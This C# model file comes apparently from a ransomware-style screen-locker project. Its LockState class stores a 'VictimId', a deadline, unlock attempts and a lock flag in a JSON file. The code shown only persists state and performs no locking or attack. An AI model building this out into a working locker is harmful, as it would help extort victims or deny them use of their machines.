namespace ScreenLocker.Models;

using System.Text.Json;

public sealed class LockState
{
    public DateTime LockStartTime { get; init; } = DateTime.UtcNow;
    public DateTime Deadline { get; init; }
    public int UnlockAttempts { get; set; }
    public bool IsLocked { get; set; } = true;
    public string VictimId { get; init; } = Guid.NewGuid().ToString("N")[..16].ToUpperInvariant();

    public static LockState CreateNew(TimeSpan duration)
    {
        return new LockState
        {
            LockStartTime = DateTime.UtcNow,
            Deadline = DateTime.UtcNow.Add(duration),
            IsLocked = true
        };
    }

    public void Save()
    {
        string path = Path.Combine(AppContext.BaseDirectory, "lock_state.json");
        string json = JsonSerializer.Serialize(this, new JsonSerializerOptions { WriteIndented = true });
        File.WriteAllText(path, json);
    }

    public static LockState? Load()
    {
        string path = Path.Combine(AppContext.BaseDirectory, "lock_state.json");
        if (!File.Exists(path))
            return null;

        string json = File.ReadAllText(path);
        return JsonSerializer.Deserialize<LockState>(json);
    }

    public bool IsExpired => DateTime.UtcNow >= Deadline;
    public TimeSpan RemainingTime => IsExpired ? TimeSpan.Zero : Deadline - DateTime.UtcNow;
}
